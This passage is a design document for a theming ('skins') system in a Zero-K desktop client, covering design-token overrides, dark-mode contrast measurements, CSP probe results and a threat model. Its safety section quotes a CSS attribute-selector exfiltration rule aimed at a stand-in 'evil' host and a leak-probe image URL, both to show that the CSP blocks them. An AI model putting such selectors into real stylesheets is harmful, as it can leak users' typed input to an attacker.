# Skins — design and scope

Status: **scoped, not built.**

Everything marked *verified* below was checked on 2026-08-18 against this
working tree: the dev server (`npm run dev`, demo data path — no server
contact), the production bundle in `dist/` served with the packaged CSP
(`tools/e2e/serve-csp.mjs`), and the token files themselves. Probe scripts and
the numbers they produced are listed in §11. Everything marked **unverified** is
exactly that — most of it is Linux, which cannot be checked from here.

The owner called this feature "self explanatory". The parts that are not are:
whether a skin can reach the design system at all (§1), where the reach has to
stop (§2), whether the single most-requested skin — a dark one — is even
expressible in tokens (§3), and what a skin is allowed to be, given that this
client holds an account password in `localStorage` (§7).

---

## 0. The short version

Four things settle the design, and three of them were not obvious before
measuring.

1. **Token overrides do reach the design system's inline styles. Verified.**
   `src/ds/shiro.js` styles every element with a `style` attribute whose values
   are literal `var(--token)` strings. The custom property is substituted at
   computed-value time, so redefining the property later in the cascade changes
   what the inline style resolves to, without touching the attribute. Injecting
   `:root{--text-faint:#ff0000}` at runtime moved a DS element's computed colour
   from `rgb(168,168,168)` to `rgb(255,0,0)`. Same for `--shell-titlebar`:
   32px → 64px, layout followed. **A skin is a custom-property override. That
   works completely.**

2. **But CSS selectors are not a skinning surface, at all.** The vendored DS
   emits exactly **one** class name in the entire 1,860-line file —
   `shiro-icon` — and no `role`, no `data-*` hooks except `data-lucide` and
   `data-tauri-drag-region`. Verified in the running app: the only class present
   anywhere in the DOM is `shiro-icon`, and `document.querySelectorAll('[role]')`
   returns nothing. A plain CSS rule cannot override an inline declaration
   (verified: `span{color:#0f0}` did nothing); an `!important` rule can
   (verified: it won). So "let skins ship arbitrary CSS" grants exactly one new
   power — `!important` on tag and attribute selectors — with nothing stable to
   aim it at, and full power to hide or overlay the UI. It is all downside.

3. **Dark mode is nearly free, and the "nearly" is two tokens.** Two skins were
   built and measured (§3). Overriding only the *semantic* layer
   (`--surface-*`, `--text-*`, `--scrim`) inverts the app but leaves every
   hairline as `rgba(0,0,0,.14)` on a dark ground — and this system puts *all*
   structure in hairlines, so every row rule, panel edge and titlebar border
   disappears. Also overriding the alpha inks and the base ramp fixes the
   structure and then breaks `MapImage`: its letterbox goes white behind dark map
   art, and its caption goes near-black on top of the black `--protect-bottom`
   gradient. Cause: **`--ink-000` and `--white` each carry two incompatible
   jobs** — a semantic one that must invert, and an "over map art" one that must
   not. There is no value that satisfies both. Fixing it needs two new tokens in
   the design project, or one targeted patch rule (§3.4).

4. **The packaged CSP already picks the file format for us. Verified against
   `dist/`.** A runtime-injected `<style>` element works (`style-src
   'unsafe-inline'`). `<link rel=stylesheet>` is blocked for `data:`, `blob:`
   *and* remote URLs, and so is `@import` of either — all reported as
   `style-src-elem` violations. `data:` images in CSS work; `data:` **fonts are
   blocked** (`font-src 'self'`), so a skin cannot ship its own typeface without
   a CSP change. Remote anything is blocked, which incidentally kills the classic
   CSS exfiltration channel before we write a line of code.

The recommended shape: **a skin is a small JSON manifest containing a
name/value map of allowlisted design tokens.** Not a stylesheet. The loader
turns it into one `:root{…}` rule and injects it as a single `<style>` element.
That is orthogonal to `src/ds/shiro.js` by construction (§6), enforceable (§2),
and cannot execute (§7).

---

## 1. What a skin is

### 1.1 The inline-style question, settled

This was the crux, so here is the evidence rather than the reasoning.

The DS renders elements like this (`src/ds/shiro.js`, `BattleRow`):

```js
style: {
  height: "var(--row-battle)",
  background: selected ? "var(--surface-selected)" : h ? "var(--surface-hover)" : "transparent",
  boxShadow: "var(--rule-inset)",
  transition: "var(--transition-hover)",
}
```

In the running app, the attribute really does contain the unresolved text:

```
DIV :: height: var(--shell-titlebar); flex: 0 0 auto; display: flex;
       align-items: center; gap: var(--sp-5); padding: 0 var(--sp-3) 0 var(--sp-5);
       border-bottom: 1px solid var(--w-12); …
```

Appending `<style>:root{--surface-base:#101010;--text-faint:#ff0000;
--w-12:rgba(255,255,255,.30);--shell-titlebar:64px}</style>` to `<head>`:

| Measured on | Before | After |
|---|---|---|
| shell background-color | `rgb(255,255,255)` | `rgb(16,16,16)` |
| `--text-faint` consumer, computed `color` | `rgb(168,168,168)` | `rgb(255,0,0)` |
| titlebar `height` | `32px` | `64px` |
| titlebar `border-bottom-color` | `rgba(0,0,0,0.14)` | `rgba(255,255,255,0.3)` |

The inline `style` attribute string was byte-identical before and after. This is
just how `var()` works — the inline declaration's value is a *pending
substitution*, resolved against the element's inherited custom properties — but
it is the whole feature, so it was worth proving rather than assuming.

**Consequence, stated precisely:**

- Anything the DS expresses **through a token** is 100% skinnable, with no
  cooperation from `src/ds/shiro.js`.
- Anything the DS **hard-codes** is unreachable by tokens. That set is small and
  now enumerated: three literal colours —
  `rgba(210,168,36,.5)` (warn Badge border), `rgba(178,18,18,.08)` (danger
  Button background), `rgba(178,18,18,.06)` (ringed `ChatLine` background) —
  plus every structural literal (`width: 3` for the faction bar, `width: 2` for
  selection indicators, `height: 30` for the Dialog header, `size = 8` for
  `PresenceDot`). Those are geometry, and skins have no business setting them.
- Anything the DS expresses through a token that means **two different things**
  is the hard case. There are exactly two, both in `MapImage`. See §3.

### 1.2 The class-hook census

Verified in the running battle list:

| Hook | Count |
|---|---|
| Distinct class names in the whole DOM | 1 (`shiro-icon`) |
| Elements with `role` | 0 |
| Usable `data-*` attributes | `data-lucide`, `data-lucide-drawn`, `data-tauri-drag-region` |
| Elements with an inline `style` attribute (login screen alone) | 88 |

The app's own screens add one more class, `lab` (39 uses), and otherwise use the
same inline-style approach — 236 `style={{…}}` sites across 12 screen files, all
referencing tokens. `src/styles/app.css` is 11 lines and handles the scrollbar,
links and focus-visible.

So a raw-CSS skin's realistic vocabulary is: `body`, `button`, `input`, `span`,
`div`, `img`, `.lab`, `.shiro-icon`, and `[style*="--row-battle"]`-style
attribute matching against the DS's own inline strings. That last one is a
selector coupled to the internals of a file that gets regenerated from an
external design project. It is the definition of a thing that breaks silently.

### 1.3 The decision

**A skin is a JSON manifest. Its payload is a flat map of design-token names to
values, drawn from a published allowlist. It is data. It never contains CSS.**

```json
{
  "schema": 1,
  "id": "ink",
  "name": "Ink",
  "author": "Shiro",
  "description": "The paper system, inverted. Ships with the app.",
  "base": "shiro-light",
  "tokens": {
    "--surface-base":   "#111214",
    "--surface-panel":  "#1a1b1e",
    "--surface-sunken": "#141517",
    "--text-hi":        "#f5f5f5",
    "--text-body":      "#e0e0e0",
    "--w-12":           "rgba(255,255,255,.14)",
    "--faction-machines": "#e05a5a"
  }
}
```

`base` names the token set the skin starts from, so a skin only has to state its
differences and a future default change flows through. `schema` lets the loader
reject a format it does not understand instead of half-applying it.

The loader is small enough to describe completely:

1. Read the manifest, reject unknown `schema`.
2. Drop any key not on the allowlist; drop any value that fails the per-token
   value grammar (§2.4). Collect both as warnings — do not fail the whole skin
   for one bad line.
3. Run the contrast check (§5). Warn; do not reject.
4. Serialise the survivors into a single `:root{…}` declaration block.
5. Replace the text content of one `<style id="shiro-skin">` element, appended
   to `<head>` after the bundled stylesheet link.

Step 5 is the entire application mechanism. There is no per-component work, no
React context, no re-render, and no theme provider — the browser recomputes
everything that reads a changed property, including the inline styles.

### 1.4 Why not raw CSS, given `!important` works

A fair objection: `!important` genuinely does override inline styles (verified),
so raw CSS *is* more powerful. Reasons not to:

- **There is nothing to select.** §1.2. The power is theoretical.
- **What can be selected is the DS's regenerated internals.** A skin keyed to
  `[style*="--row-battle"]` breaks on a re-sync that changes a token name, with
  no error — just a skin that stops doing half of what it did.
- **The failure mode is not "ugly", it is "unusable".** `button{display:none
  !important}` is four words and removes every control including the one that
  changes the skin back. A token-map skin cannot express that. (A safe-mode
  escape hatch is still needed regardless — §9.)
- **It is a one-way door.** Token maps can be widened into CSS later if a real
  need appears. Published CSS skins cannot be narrowed without breaking every
  skin in the community.

### 1.5 Applying it without a flash

`settings.ts` persists to `localStorage` today and is read synchronously at
module load. The skin should do the same: cache the *resolved CSS text* under
`shiro.skin.css` and inject it from `main.jsx` **before** `createRoot`, so the
first paint is already skinned. The manifest read (from disk, via IPC, async)
then happens after boot and only rewrites the `<style>` if the text differs.

Without this, a disk-loaded skin arrives one or two frames after first paint and
the app flashes white on every launch — which is the single most visible bug a
dark skin can have.

---

## 2. Reach — which tokens a skin may set

146 tokens are defined, across five files (`fonts.css` defines none; it is
`@font-face` only). 30 of them are currently referenced nowhere in `src/`
(listed in §2.5) — that is not a problem, but the allowlist should be built from
what the DS actually reads, not from what the files declare.

The tiers below are a proposal, not an observation. The evidence behind them is.

### 2.1 What actually breaks — measured

The interesting result: **almost nothing "breaks".** The shell is a flex column
with `overflow: hidden`, so abusive token values do not blow out the layout —
they silently *hide information*. At 1280×720, with the battle list populated:

| Token change | Document overflow | Text clipped |
|---|---|---|
| baseline | 0 × 0 | none |
| `--shell-titlebar` 32 → 72px | 0 × 0 | none |
| `--shell-nav` 56 → 160px | 0 × 0 | 2 battle titles ellipsised |
| `--shell-statusbar` 24 → 96px | 0 × 0 | none |
| `--row-battle` 56 → 140px | 0 × 0 | none |
| `--row-default` 32 → 8px | 0 × 0 | none |
| `--control-md` 30 → 72px | 0 × 0 | none |
| `--sp-4` 8 → 28px | 0 × 0 | none |
| `--sp-5` 12 → 40px | 0 × 0 | **6 battle titles ellipsised** |
| `--size-micro` 11 → 20px | 0 × 0 | column headers `PLAYERS`, `SPEC` |
| `--font-core` → Georgia | 0 × 0 | none |
| all type sizes +40% | 0 × 0 | `PLAYERS`; room roster drops from 6 visible names to 3 |
| `--radius-none` 0 → 14px | 0 × 0 | none |

That last-but-one row is the one that matters. DESIGN_HANDOFF §2 says density is
a feature and this audience "will resent a design that hides data". A skin that
scales type up by 40% does not look broken — it looks fine and quietly shows you
half the roster. **The reach boundary should be drawn to protect information
density, not to prevent visual breakage**, because visual breakage is not the
failure mode this layout has.

### 2.2 The tiers

**Tier A — free.** Any valid value. All colour tokens except those in Tier D.

`--ink-*`, `--ash-*`, `--paper-*`, `--white`, `--w-04…--w-72`, `--k-*`,
`--surface-*`, `--text-hi|body|mid|low|faint|inverse|link`, `--scrim`,
`--signal-danger|warn|ok|info`, `--elev-menu|dialog|flat`, `--focus-ring`,
`--rule-inset`, `--border-*`.

Colour is where 90% of the skinning value is and none of the layout risk.

**Tier B — bounded.** Allowed, clamped by the loader.

| Token group | Proposed clamp | Why |
|---|---|---|
| `--size-micro` … `--size-4xl` | ±20% of default, and the ordering must stay monotonic | +40% loses roster rows (§2.1) |
| `--font-core`, `--font-mono`, `--font-display` | font-family list only; no `url()`; must end in a generic family | `font-src 'self'` blocks skin-supplied faces anyway (§7.2) |
| `--w-regular` … `--w-bold` | 100–900 integers | free |
| `--lh-*` | 0.9–2.0 | free |
| `--track-*` | −0.05em … 0.3em | free |
| `--radius-*` | 0–16px | 999px on a battle row is a taste question, not a correctness one |
| `--dur-*` | 0–600ms | DESIGN_HANDOFF §4 motion budget; a 5s transition on hover is a CPU and a usability problem |
| `--ease-*`, `--transition-*`, `--press-shift` | allowed | free |

**Tier C — fixed. Not exposed.**

`--sp-0` … `--sp-12`, `--shell-titlebar`, `--shell-nav`, `--shell-statusbar`,
`--shell-gutter`, `--row-compact|default|tall|battle`, `--control-sm|md|lg`,
`--measure-prose`, `--panel-min`, `--wdth-*`.

These are the layout. `--sp-4` alone is read 73 times and `--sp-5` 54 times
across the DS and the screens; `--sp-5` is the one that ellipsised six rows.
The 4px grid, the fixed chrome heights and the row snap are what make the design
a system rather than a collection of screens (spacing.css: *"the app shell is a
fixed grid, never fluid"*). Excluding them costs a skin nothing that anyone
actually wants and removes the entire class of "my skin hides data" bug.

Note also that `--shell-titlebar` is the drag region height for a `decorations:
false` window. A skin setting it to `0` would remove the only way to move the
window.

**Tier D — locked. Meaning-bearing.** See §4.

`--faction-machines|hegemony|rising`, `--presence-online|away|room|ingame|
offline|bot`, `--protect-bottom`, `--protect-full`, `--fff-56`, `--fff-72`.

Locked *by default*, with a narrow exception described in §4 — because as §3
shows, "locked" and "dark skin" are in direct conflict.

### 2.3 The `--w-` collision — read this before writing the allowlist

Two unrelated token families share the `--w-` prefix:

```
--w-04 --w-06 --w-08 --w-12 --w-20 --w-32 --w-56 --w-72   black alpha inks
--w-regular --w-medium --w-semibold --w-bold              font weights
```

Any allowlist or validator built on prefix matching (`--w-*` is a colour) will
accept `--w-bold: rgba(0,0,0,.5)` and reject nothing. Enumerate the tokens
explicitly. This is also a good candidate to report upstream to the design
project as a rename (`--alpha-12`, `--weight-bold`), since it costs nothing
there and is a permanent trap here.

### 2.4 Value grammar

Per-token, not per-tier. The loader should know each token's expected shape:

- colour → `#rgb|#rrggbb|#rrggbbaa`, `rgb()/rgba()`, or a named CSS colour.
  Reject `var()`, `url()`, `image-set()`, `element()`, and anything containing
  `(` other than `rgb`/`rgba`/`hsl`/`hsla`.
- length → integer or decimal with `px`/`em`/`rem`/`ch`, within the clamp.
- number → bare numeric within range.
- shadow / gradient composites (`--elev-*`, `--focus-ring`, `--rule-inset`,
  `--protect-*`) → the most permissive slot; still reject `url(`.

Rejecting `url(` everywhere is the single highest-value rule in the validator:
it is what stops a skin from making network requests at all, independent of the
CSP.

### 2.5 Tokens defined but unread

Currently referenced nowhere in `src/`:

```
--ash-200 --ink-300 --k-64 --w-56 --w-72 --paper-* (partly)
--border-hair --border-line --border-strong --border-focus --elev-flat
--radius-hair --dur-instant --ease-in --transition-enter
--measure-prose --panel-min --shell-gutter --sp-0 --sp-1 --sp-11
--size-lg --surface-active --surface-raised --text-link
--presence-bot --protect-full --signal-info --signal-ok
--wdth-tight --wdth-normal
```

Some are genuinely dead; some (`--presence-bot`, `--border-*`) are tokens the DS
*should* be using and is not. Either way, exposing them to skins is a promise
that changing them does something, which today it does not. Ship the allowlist
from the read set, and re-derive it when the DS is re-synced (§6.2).

---

## 3. Dark mode

This will be the first request. It is worth being exact about what does and does
not work, because the obvious implementation produces something that looks
plausible in a screenshot and is unusable in practice.

`colors.css` states the position: *"Shiro is a light system: paper is the
surface, ink is the structure."* Structure is carried by hairlines built from
black alpha (`--w-04` … `--w-72`) — `borders.css`: *"Hairlines carry all
structure in this system — there are no drop shadows in the flat UI."*

Two candidate dark skins were built and run against the live battle list.

### 3.1 Skin A — semantic layer only

Overrode `--surface-*`, `--text-*`, `--scrim`. Left the ink/paper ramp and the
alpha inks alone.

Result: backgrounds and body text invert correctly, and the **entire structure
of the app disappears.** Measured: titlebar `border-bottom-color` stayed
`rgba(0,0,0,0.14)`. In the screenshot there are no row rules, no panel edges, no
statusbar separator — ten battle rows in an undivided field.

Also broken, by arithmetic on the unchanged tokens against a `#111214` ground:

| Token | Resolves to | Contrast on dark |
|---|---|---|
| `--presence-online` (= `--ink-000`) | `#0a0a0a` | **1.06:1** — invisible |
| `--presence-room` (= `--ash-600`) | `#555555` | 2.51:1 |
| `--presence-ingame` (= `--signal-danger`) | `#b21212` | 2.67:1 |
| `--faction-machines` | `#b21212` | 2.67:1 |
| `--faction-hegemony` | `#3f5fa8` | 3.05:1 |
| `--faction-rising` | `#5f7d10` | 3.95:1 |

The "online" presence dot — the most-repeated glyph in the app — becomes
invisible. Semantic-only inversion is not a viable dark mode.

### 3.2 Skin B — semantic layer plus the alpha inks and the base ramp

Skin A, plus `--w-04…--w-32` flipped to white alphas, plus
`--ink-000|100|200` → light, `--white` → `#111214`, `--paper-*` → dark,
`--ash-*` re-ordered.

Result: **structure returns** (measured: titlebar border
`rgba(255,255,255,0.14)`; the screenshot shows every row rule back). And
`MapImage` breaks, in two directions at once:

| Measured | Light | Skin B |
|---|---|---|
| `MapImage` container background (`var(--ink-000)`) | `rgb(10,10,10)` | `rgb(245,245,245)` — a white letterbox behind dark map art |
| Map caption colour (`var(--white)`) | `rgb(255,255,255)` | `rgb(17,18,20)` — near-black, sitting on the black `--protect-bottom` gradient |
| `ZERO-K.INFO ↗` label (`var(--fff-72)`) | white on dark art | white on the now-white letterbox — invisible |

`--protect-bottom` itself is fine: it is a black gradient over map imagery, and
map imagery is dark art regardless of the app's ground. It does not need to
invert and must not. The problem is only the text and the letterbox around it.

### 3.3 The actual cause: two overloaded tokens

`--ink-000` is read seven times in the DS and three times in the screens:

| Consumer | Under a dark skin it must be |
|---|---|
| Dialog urgent border (`shiro.js:488`) | **light** |
| Input focus border (`:572`) | **light** |
| Meter fill (`:656`) | **light** |
| Tabs active underline (`:899`) | **light** |
| `BattleRow` selection bar (`:1351`), `PlayerRow` selection bar (`:1746`) | **light** |
| Nav / friends / queue active indicators (screens ×3) | **light** |
| `--focus-ring` outer ring (`borders.css:19`) | **light** |
| **`MapImage` letterbox (`:1221`)** | **dark** |

`--white` is read three times in the DS:

| Consumer | Under a dark skin it must be |
|---|---|
| `<option>` background in `Select` (`:798`, `:804`) | **dark** |
| `--focus-ring` inner ring, `--surface-*`, `--text-inverse` (indirection in `colors.css`) | **dark** |
| **`MapImage` caption text (`:1273`)** | **light** |

Two tokens, each with one consumer that wants the opposite of every other
consumer, and both of the odd ones out are in `MapImage`. That is the whole of
the dark-mode problem. It is not a token-structure failure in general — 144 of
146 tokens invert cleanly — it is two specific overloads.

### 3.4 Options

**(a) Fix it upstream. Recommended.** Add two tokens to the design project and
have `MapImage` read them:

```css
--map-letterbox: var(--ink-000);   /* the ground behind map art */
--overlay-ink:   var(--white);     /* text that sits on map art */
```

Default values keep today's rendering identical, so it is a no-op re-sync for
the light system. A dark skin then leaves both at their light-system values
while inverting everything else. Cost: one request to the design project, one
re-sync, re-applying the three vendor patches (README). It is the only option
that leaves `src/ds/shiro.js` unedited and makes third-party dark skins correct
by default.

**(b) A patch rule shipped with the loader, not with the skin.** The loader
already injects a `<style>`; it can append a fixed rule that the skin cannot
author or remove:

```css
:root[data-skin-dark] div:has(> img[src^="https://zero-k.info/Resources/"]) { background: #0a0a0a !important; }
```

Works, but depends on `:has()`, which is a Linux question (§8), and re-couples
us to the DS's DOM shape — the thing §1.4 argues against. Acceptable as a
stopgap while (a) is in flight; not acceptable as the design.

**(c) Ship dark as a first-party skin only and accept the two artefacts.**
Cheapest, and wrong: the letterbox is visible on every battle row while
thumbnails load and on every 404, and the caption is illegible permanently.

**Recommendation: (a), and do it before the skin system ships publicly.** Once
third-party dark skins exist, they will each have worked around this differently
and a later fix breaks them.

### 3.5 Everything else about dark, for the record

- `--scrim` is `rgba(255,255,255,.82)` — a *white* scrim, the clearest tell that
  this is a light system. It is a token; overriding it to a black scrim works
  (verified).
- `--elev-menu` / `--elev-dialog` contain literal `rgba(0,0,0,.10)` /
  `rgba(0,0,0,.16)` shadows. On a dark ground they become invisible rather than
  wrong. They are Tier A tokens, so a skin can replace them wholesale.
- `--focus-ring` is `0 0 0 1px var(--white), 0 0 0 2px var(--ink-000)`. Under a
  full inversion it becomes dark-inner/light-outer, which is correct. No action.
- The 404 fallback in `MapImage` uses `--surface-sunken` and `--text-low` and
  inverts cleanly. Only the loaded/caption path is affected.
- The app never reads `prefers-color-scheme`. Whether "follow the OS" is a skin
  or a setting above skins is an open question (§10).

---

## 4. Faction and presence colours

### 4.1 They mean something

`--faction-machines|hegemony|rising` come from the connection handshake
(DESIGN_HANDOFF §6) and are a persistent player identity. `--presence-*` encode
the four protocol presence states plus the bot flag — online, away, in a battle
room, in game. A skin that recolours these is not restyling, it is relabelling:
a player whose faction bar is now the same hue as someone else's has lost
information the server sent.

`PresenceDot` mitigates this deliberately — *"shape carries the state as well as
colour: filled = active, ring = away, square = bot"* — so presence survives a
colour collision better than faction does. Faction has no shape channel: all
three variants (`bar`, `dot`, `label`) differ only in hue.

### 4.2 But locking the values makes dark mode illegal

This is the tension, and it is measurable. The design system deliberately
darkened the official faction colours "so they hold contrast on paper". On dark
ground, that darkening is exactly backwards:

| | official (in-game) | on white | Shiro value | on white | Shiro value on `#111214` |
|---|---|---|---|---|---|
| Machines | `#e51616` | 4.71 | `#b21212` | 7.03 | **2.67** |
| Hegemony | `#7292d3` | 3.10 | `#3f5fa8` | 6.15 | **3.05** |
| Rising | `#a7d224` | 1.77 | `#5f7d10` | 4.74 | **3.95** |

Two of the three fall below the 3:1 non-text floor on a dark ground. And the
*original server-supplied* values score 3.98 / 6.04 / 10.61 on `#111214` — they
are the right values for a dark skin, which is not a coincidence, since the game
they come from is dark.

### 4.3 Recommendation

Lock the **identity mapping**, not the value. Specifically:

- A skin **may** set `--faction-*` and `--presence-*`, but only within a
  per-token hue window (proposal: ±25° hue from the default, any
  lightness/saturation). Machines stays red, Hegemony stays blue, Rising stays
  green; a dark skin can lift all three toward the in-game values.
- The loader **rejects** a faction or presence set in which any two resolved
  colours are within a small ΔE of each other, or in which any falls below 3:1
  against the skin's own `--surface-base`. This is the one place a hard reject
  is justified: it is not taste, it is a state the user can no longer read.
- `--presence-online` deserves a special note in author documentation: it
  defaults to `var(--ink-000)`, so a skin that darkens the ground and forgets it
  gets an invisible dot at 1.06:1. That is the most likely single mistake in a
  first community skin.

If that is too much machinery for v1, the fallback is: **Tier D locked, and the
first-party dark skin is the only thing allowed to move them.** It ships a
correct set, and the question is revisited when someone actually asks.

---

## 5. Accessibility floor

If skins set colour freely, contrast can be destroyed. Measured under the
semantic-only dark skin (§3.1), which is what a well-intentioned first attempt
looks like:

| Pair | Ratio | WCAG AA text (4.5) |
|---|---|---|
| `--text-hi` on `--surface-base` | 17.19 | pass |
| `--text-low` on `--surface-base` | 5.43 | pass |
| `--text-faint` on `--surface-base` | 3.73 | fail |
| `--signal-warn` on `--surface-base` | 3.70 | fail |
| `--faction-machines` on `--surface-base` | 2.67 | fail (also fails the 3:1 non-text floor) |
| `--presence-online` on `--surface-base` | 1.06 | fail |

Note `--text-faint` fails at 2.38:1 in the *shipped light system* too, against
white. It is used for timestamps and de-emphasised metadata, which is a
defensible design choice — so a validator that hard-fails on WCAG AA would
reject Shiro's own default. That is the argument against hard-failing.

**Recommendation: validate, warn, never silently reject.**

- On load, compute contrast for a fixed list of ~12 pairs (each `--text-*`
  against `--surface-base` and `--surface-panel`; each `--presence-*` and
  `--faction-*` against `--surface-base`).
- Show the failures in the Settings skin picker, named and numbered, next to the
  skin. Not a modal — a line that says "3 contrast warnings" and expands.
- Hard-reject only the unreadable-state cases in §4.3: a presence or faction
  colour below 3:1 against its own background, or two faction colours that have
  collapsed together.
- Ship the checker as a pure function with unit tests, in `src/theme/`, so skin
  authors can be given a CLI that runs the same code.

Cost of the full thing: about a day. Cost of doing nothing: the first popular
community skin sets `--text-mid` to something pretty and the chat becomes
unreadable, and the bug reports arrive against Shiro, not against the skin.

---

## 6. Re-sync survival

### 6.1 Confirmed: token overrides are orthogonal to the vendored DS

The mechanism is safe by construction, and this was checked rather than assumed:

- `src/ds/shiro.js` contains **zero** custom-property *definitions*. It only
  reads them. (`grep` for `--name:` outside `var()` → no matches.)
- All 146 tokens are defined in `src/styles/tokens/*.css` and nowhere else in
  `src/`.
- `vendor/_ds_bundle.js` — the raw export the DS is extracted from — also
  contains no token definitions (`--ink-000:` → 0 matches). The README is
  accurate: tokens are mirrored by hand from the design project's `tokens/*.css`,
  they are not part of the component bundle.

So the answer to "does a skin survive a re-sync" is **yes, by construction, as
long as a skin is a token map.** A re-sync rewrites `src/ds/shiro.js`; a skin
never touches it, never selects into it, and never needs a hook added to it. The
only thing a skin depends on is the *names* of the tokens the DS reads.

### 6.2 The real risk is name drift, and it is silent

A re-sync can introduce tokens, rename tokens, or change which token a component
reads. None of those produce an error — they produce a skin that is subtly
wrong, most likely one element that stayed light.

Mitigate the way this repo already mitigates the same class of problem for
icons. `npm test` runs `node tools/gen-icons.mjs --check` and fails if the icon
list drifts from what the source draws. Add the sibling:

```
tools/gen-tokens.mjs --check
```

which parses `src/styles/tokens/*.css` and every `var(--…)` in `src/ds/` and
`src/screens/`, and fails if:

- a token is read but not defined (a re-sync introduced a new one — the
  allowlist needs a decision about it), or
- the generated allowlist in `src/theme/tokens.json` no longer matches the read
  set.

That turns a silent skin regression into a red test on the re-sync commit, which
is exactly when someone is in a position to fix it.

### 6.3 One thing to note about the re-sync itself

There is no extraction script in `tools/` — `gen-icons`, `gen-protocol` and
`fetch-fonts` exist, but the `vendor/_ds_bundle.js` → `src/ds/shiro.js` step is
manual, and three vendor patches have to be re-applied by hand afterwards
(README, "Vendor patches"). That is a pre-existing risk, not a skin risk, but it
raises the cost of the §3.4(a) recommendation from "a re-sync" to "a manual
re-sync plus three patches". Worth knowing before scheduling it.

---

## 7. Distribution and safety

This client holds an account password. `src/store/settings.ts` stores it in
`localStorage`, in plaintext, when "stay logged in" is ticked — documented and
deliberate ("the hash is not a secret in this protocol anyway — it is a password
equivalent"). That fact sets the bar for what a skin is allowed to be.

### 7.1 A skin must be data, never code

If a skin could execute JavaScript in the page, it would inherit:

- `localStorage['shiro.settings']` — account name and plaintext password.
- The whole IPC surface registered in `src-tauri/src/lib.rs`: `zks_send`
  (send arbitrary protocol commands as the logged-in user), `zks_password_hash`,
  `zks_write_engine_settings` (write into the Zero-K install), and
  `zks_launch_spring` — which spawns an engine binary resolved from an install
  root that the frontend can set. There is no capability boundary between page
  JS and those commands; `capabilities/default.json` scopes window controls, not
  custom commands.

That is not "a skin can look bad", that is arbitrary process execution and
credential theft. **No JavaScript in skins, at any point, under any framing
(`"init": "…"`, template expressions, a "smart token" that is a function).** The
JSON-manifest format in §1.3 has no slot where code could live, which is most of
the point of choosing it.

### 7.2 What the packaged CSP already prevents — verified against `dist/`

Probed with the real policy from `tauri.conf.json`, served by
`tools/e2e/serve-csp.mjs`:

| Attempt | Result |
|---|---|
| Runtime-injected `<style>` with token overrides | **works** — `style-src 'unsafe-inline'` |
| `<link rel=stylesheet href="data:text/css,…">` | blocked — `style-src-elem` |
| `<link rel=stylesheet href="blob:…">` | blocked — `style-src-elem` |
| `<link rel=stylesheet href="https://…">` | blocked — `style-src-elem` |
| `@import url("data:text/css,…")` | blocked — `style-src-elem` |
| `@import url("https://…")` | blocked — `style-src-elem` |
| `background-image: url("https://example.invalid/x.png?leak=1")` | blocked — `img-src` |
| `background-image: url("data:image/gif;base64,…")` | **works** — `img-src … data:` |
| `@font-face { src: url("data:font/woff2;…") }` | blocked — `font-src 'self'` |
| `@font-face { src: url("https://fonts.gstatic.com/…") }` | blocked — `font-src` |

Two consequences worth stating plainly:

- **The classic CSS exfiltration channel is already closed.** The trick —
  `input[value^="a"]{background:url(https://evil/a)}` — needs a network sink,
  and every off-origin sink is blocked. The only allowed remote host is
  `https://zero-k.info` (for map images), whose access logs belong to the Zero-K
  operators, not to a skin author. This is a genuine, load-bearing mitigation
  and it exists today for unrelated reasons.
- **A skin cannot ship a typeface.** `--font-core` can only name families
  already present: the two vendored faces, or whatever is installed on the
  user's machine. If skin-supplied fonts are ever wanted, that is a CSP change
  (`font-src 'self' data:`) and a deliberate decision, not an accident.

### 7.3 What a hostile skin could still do

Even as pure data, and even inside the CSP:

- **Defacement.** Unreadable text, invisible controls, colours that make a
  locked battle look unlocked or an in-game player look idle. The Tier D rules
  (§4) and the contrast check (§5) exist for this.
- **Denial of use.** A skin that makes text the same colour as the background
  removes the user's ability to navigate to the setting that changes it back.
  This is why §9 lists a safe-mode escape hatch as MVP scope, not polish.
- **Not** credential theft, not network access, not process execution — none of
  which a token map can express and none of which the CSP would carry.

The residual risk is therefore "annoying and possibly misleading", which is
proportionate to a cosmetic feature. It stops being proportionate the moment
raw CSS or JS is allowed.

### 7.4 Where skins come from

Staged, in this order:

1. **Bundled.** Two or three skins compiled into the app: the default (`Paper`),
   a dark one (`Ink`), and arguably a high-contrast one. No IO, no trust
   question. This is the MVP.
2. **A user folder.** `%APPDATA%\info.zero-k.shiro\skins\*.json`, scanned at
   launch, listed in Settings with a "open folder" button. Needs a new
   `src-tauri/src/skins.rs` — a sibling of `engine_settings.rs`, which already
   does file IO with the same shape (pure parse/apply functions + a
   `#[tauri::command]`). No Tauri fs plugin required, and not adding one keeps
   the capability surface as small as it is today.
3. **Import a file.** Needs the dialog plugin and a capability entry. Defer
   until someone asks.
4. **A gallery / in-app browser.** Explicitly out of scope. It needs hosting,
   moderation and a trust story, and none of that is worth building before
   anyone has made a skin.

On signing: skins do not need it at stage 2. The Tauri updater's minisign keypair
(ARCHITECTURE §11) signs *app* artifacts; a signed-skin scheme would be a new
trust root for a data file that cannot execute. Not worth it unless stage 4
happens.

---

## 8. Linux

DESIGN_HANDOFF §4 flags that Linux renders via WebKitGTK, not Chromium, and asks
for any dependency on newer CSS to be flagged early.

**First, a fact that reframes the question: Linux is not currently a build
target.** `tauri.conf.json` bundles `["nsis"]` only, the sole CI workflow is
`windows-installer.yml`, and there is no Linux configuration anywhere in the
repo. The WebKitGTK constraint is prospective. It should still be honoured,
because the cost of honouring it here is zero.

**The mechanism itself is safe on any engine that ships this app.** CSS custom
properties, `var()` substitution and runtime `<style>` injection are all
2016-era features. Nothing in §1 is at risk.

**Unverified, and the reason for the conservative rules in §2.4:** the following
would each be convenient for skin authoring and each carry a WebKitGTK question
I cannot answer from a Windows machine.

| Feature | Why a skin would want it | Status |
|---|---|---|
| `color-mix()` | Derive the whole 8-step alpha-ink ramp from one colour, so a skin is 10 lines instead of 40 | **unverified on WebKitGTK.** The single most useful one; worth testing first |
| Relative colour syntax `rgb(from …)` | Same, plus deriving `--text-mid` from `--text-hi` | **unverified** |
| `:has()` | Required by the §3.4(b) `MapImage` stopgap | **unverified**; another reason to prefer §3.4(a) |
| `@layer` | Would let the skin sheet win without depending on document order | not needed — source order already works |
| Container queries, `backdrop-filter` | not used by the DS (Dialog explicitly avoids `backdrop-filter` "because it degrades under WebKitGTK on Linux") | n/a |

**Recommendation:** the loader emits **plain hex/rgba literals only**. Skin
manifests carry values, not expressions; if a skin author wants derived colours,
that is a job for an authoring tool that resolves them before writing the file,
not for the runtime. That makes the emitted CSS a flat list of custom-property
declarations — the most boring thing that can be emitted, and correct on every
